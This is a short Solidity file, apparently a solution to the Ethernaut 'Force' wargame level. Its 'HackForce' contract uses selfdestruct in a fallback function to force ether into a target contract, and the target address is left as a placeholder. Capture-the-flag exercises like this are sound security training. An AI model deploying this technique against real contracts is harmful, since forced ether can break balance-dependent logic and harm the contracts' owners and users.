pragma solidity 0.5.6;

interface ETHERNAUTS {
    function main() external;
}

contract HackForce {
    ETHERNAUTS public ethernauts;

    constructor() public {
       ethernauts  = ETHERNAUTS(your_contract_instance);
    }
    
    function() payable external {
    selfdestruct(your_contract_instance);
    }
}